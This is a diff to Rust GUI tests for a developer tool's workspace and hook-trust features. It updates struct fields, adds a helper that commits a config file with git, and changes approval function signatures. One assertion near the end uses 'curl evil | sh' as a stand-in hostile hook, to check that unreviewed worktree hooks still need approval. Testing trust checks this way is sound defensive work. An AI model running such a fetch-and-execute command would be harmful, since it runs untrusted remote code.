@@ -119,7 +119,7 @@ pub(super) fn installed() -> Detection {
         path: Some(PathBuf::from("/usr/local/bin/pitchfork")),
         installed: true,
         version: Some("2.29.0".into()),
-        missing_features: Vec::new(),
+        unsupported: None,
         problem: None,
     }
 }
@@ -238,6 +238,7 @@ pub(super) fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
             busy: false,
             drift: None,
             env_file: None,
+            recipes: None,
         },
         WorkspaceStatus {
             workspace: workspace("feature-x", false),
@@ -246,6 +247,7 @@ pub(super) fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
             busy: false,
             drift: None,
             env_file: None,
+            recipes: None,
         },
         WorkspaceStatus {
             workspace: workspace("adopted", false),
@@ -254,6 +256,7 @@ pub(super) fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
             busy: false,
             drift: None,
             env_file: None,
+            recipes: None,
         },
     ];
     model.selected_workspace = Some(ws_path("main"));
@@ -316,12 +319,12 @@ pub(super) fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
         },
         ..Config::default()
     };
-    model.project = Some(Arc::new(Project {
-        root: PathBuf::from("/tmp/shop"),
-        git_common_dir: PathBuf::from("/tmp/shop/.git"),
-        config_path: PathBuf::from("/tmp/shop/devflow.toml"),
+    model.project = Some(Arc::new(Project::new(
+        PathBuf::from("/tmp/shop"),
+        PathBuf::from("/tmp/shop/.git"),
         config,
-    }));
+        PathBuf::from("/tmp/shop/devflow.toml"),
+    )));
     model.trust = Some(TrustState::Untrusted {
         digest: "x".into(),
         previously_trusted: false,
@@ -552,7 +555,9 @@ fn trust_snapshot_reset_and_initialize_dialogs_render(cx: &mut TestAppContext) {
     cx.update_window(h.window.into(), |_, window, cx| {
         super::dialogs::with_trust(
             &h.state,
-            std::path::Path::new("/tmp/shop/main"),
+            // The project root: the in-memory configuration is the main
+            // checkout's. A workspace at a made-up path has no file of its own.
+            std::path::Path::new("/tmp/shop"),
             TrustPurpose::Setup,
             window,
             cx,
@@ -634,10 +639,29 @@ pub(super) fn init_scratch_repo(repo: &std::path::Path) -> Entry {
         },
     )
     .unwrap();
+    // A workspace runs the recipes of its own branch: the file is committed, as
+    // a person does after `init`.
+    commit_config(repo);
     Entry {
         id: project.id(),
         name: project.name().to_string(),
         root: project.root.clone(),
+    }
+}
+
+/// Commit `devflow.toml` as it is in the checkout at `dir`.
+pub(super) fn commit_config(dir: &std::path::Path) {
+    for args in [
+        &["add", "devflow.toml"][..],
+        &["commit", "-q", "-m", "devflow.toml"][..],
+    ] {
+        let status = std::process::Command::new("git")
+            .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
+            .args(args)
+            .current_dir(dir)
+            .status()
+            .unwrap();
+        assert!(status.success(), "git {args:?}");
     }
 }
 
@@ -789,6 +813,7 @@ fn creating_a_workspace_enters_it_like_a_switch_from_the_command_line(cx: &mut T
         format!("{base}[hooks]\nsetup = []\nswitch = [\"touch entered.txt\"]\nteardown = []\n"),
     )
     .unwrap();
+    commit_config(&scratch.entry.root);
     trust::approve(&Project::open(&scratch.entry.root).unwrap()).unwrap();
 
     let h = open_scratch(cx, &scratch);
@@ -1087,6 +1112,7 @@ fn select_other_project(state: &mut AppState) {
             busy: false,
             drift: None,
             env_file: None,
+            recipes: None,
         })
         .collect();
     model.selected_workspace = Some(ws_path("main"));
@@ -1193,7 +1219,9 @@ fn the_trust_dialog_shows_the_whole_hooks_section_that_trusting_approves(cx: &mu
     cx.update_window(h.window.into(), |_, window, cx| {
         super::dialogs::with_trust(
             &h.state,
-            std::path::Path::new("/tmp/shop/main"),
+            // The project root: the in-memory configuration is the main
+            // checkout's. A workspace at a made-up path has no file of its own.
+            std::path::Path::new("/tmp/shop"),
             TrustPurpose::Setup,
             window,
             cx,
@@ -1237,7 +1265,9 @@ fn a_trust_answer_is_dropped_when_another_project_was_selected(cx: &mut TestAppC
     cx.update_window(h.window.into(), |_, window, cx| {
         super::dialogs::with_trust(
             &h.state,
-            std::path::Path::new("/tmp/shop/main"),
+            // The project root: the in-memory configuration is the main
+            // checkout's. A workspace at a made-up path has no file of its own.
+            std::path::Path::new("/tmp/shop"),
             TrustPurpose::Setup,
             window,
             cx,
@@ -1300,7 +1330,7 @@ fn approving_stores_exactly_the_reviewed_hooks_and_rejects_changed_ones() {
         message,
         project: fresh,
         scope,
-    } = approve_reviewed(&project, &root, &reviewed)
+    } = approve_reviewed(&project, &root, &reviewed, false)
     else {
         panic!("a changed [hooks] section must not be approved");
     };
@@ -1313,7 +1343,7 @@ fn approving_stores_exactly_the_reviewed_hooks_and_rejects_changed_ones() {
 
     // Reviewing the new content and approving it works.
     assert!(matches!(
-        approve_reviewed(&fresh, &root, &scope),
+        approve_reviewed(&fresh, &root, &scope, false),
         Approval::Approved
     ));
     assert_eq!(trust::state(&fresh).unwrap(), trust::TrustState::Trusted);
@@ -1526,6 +1556,7 @@ fn refreshed(h: &Harness, cx: &mut TestAppContext, daemon_name: &str) -> Refresh
             "/tmp/shop/main",
             vec![daemon(daemon_name, "running", &[], None, false)],
         )),
+        focus: None,
         config: None,
         logs: None,
     }
@@ -2217,7 +2248,7 @@ fn the_palette_opens_a_daemons_url_shows_how_to_install_pitchfork_and_runs_the_d
             path: None,
             installed: false,
             version: None,
-            missing_features: Vec::new(),
+            unsupported: None,
             problem: None,
         });
         cx.notify();
@@ -2666,11 +2697,13 @@ fn the_new_workspace_row_of_a_project_waits_for_it_to_load(cx: &mut TestAppConte
             busy: false,
             drift: None,
             env_file: None,
+            recipes: None,
         }]),
         database: DatabaseModel::default(),
         services: crate::services::ServicesModel::default(),
         trust: Ok(TrustState::Trusted),
         pitchfork: None,
+        focus: None,
         config: None,
         logs: None,
     };
@@ -3244,7 +3277,7 @@ fn a_missing_pitchfork_shows_the_commands_to_install_it_and_never_runs_them(
             path: None,
             installed: false,
             version: None,
-            missing_features: Vec::new(),
+            unsupported: None,
             problem: None,
         },
         // A mise shim without a version: on PATH, executable, exits 1.
@@ -3252,7 +3285,7 @@ fn a_missing_pitchfork_shows_the_commands_to_install_it_and_never_runs_them(
             path: Some(PathBuf::from("/Users/me/.local/share/mise/shims/pitchfork")),
             installed: false,
             version: None,
-            missing_features: Vec::new(),
+            unsupported: None,
             problem: Some("mise ERROR No version is set for shim: pitchfork".into()),
         },
     ] {
@@ -3294,7 +3327,11 @@ fn a_missing_pitchfork_shows_the_commands_to_install_it_and_never_runs_them(
                 path: Some(PathBuf::from("/usr/local/bin/pitchfork")),
                 installed: true,
                 version: Some("2.1.0".into()),
-                missing_features: vec!["start --local".into()],
+                unsupported: devflow_core::tools::judge(
+                    devflow_core::tools::Tool::Pitchfork,
+                    "2.14.0",
+                )
+                .err(),
                 problem: None,
             }),
             status: Some(process_status("main", "/tmp/shop/main", Vec::new())),
@@ -3363,7 +3400,7 @@ fn the_review_before_starting_is_of_the_workspaces_own_files_and_so_is_its_appro
     let h = open_scratch(cx, &scratch);
     let prompt = |cx: &mut TestAppContext, target: &std::path::Path| {
         cx.read_entity(&h.state, |s, _| {
-            s.trust_prompt(target, TrustPurpose::Processes)
+            s.trust_prompt(target, TrustPurpose::Processes, false)
         })
     };
     let run_of = |prompt: &crate::state::TrustPrompt| {
@@ -3384,7 +3421,7 @@ fn the_review_before_starting_is_of_the_workspaces_own_files_and_so_is_its_appro
     // Approving what main showed approves main's files, and judges the
     // worktree on its own: it is still to be reviewed.
     assert!(matches!(
-        approve_reviewed(&main_prompt.project, &root, &main_prompt.scope),
+        approve_reviewed(&main_prompt.project, &root, &main_prompt.scope, false),
         Approval::Approved
     ));
     assert!(prompt(cx, &root).is_none(), "main is approved now");
@@ -3392,7 +3429,7 @@ fn the_review_before_starting_is_of_the_workspaces_own_files_and_so_is_its_appro
     assert_eq!(run_of(&again), "curl evil | sh");
     // The scope shown for main cannot be approved as the worktree's.
     assert!(matches!(
-        approve_reviewed(&main_prompt.project, &feature, &main_prompt.scope),
+        approve_reviewed(&main_prompt.project, &feature, &main_prompt.scope, false),
         Approval::Changed { .. }
     ));
     assert!(matches!(
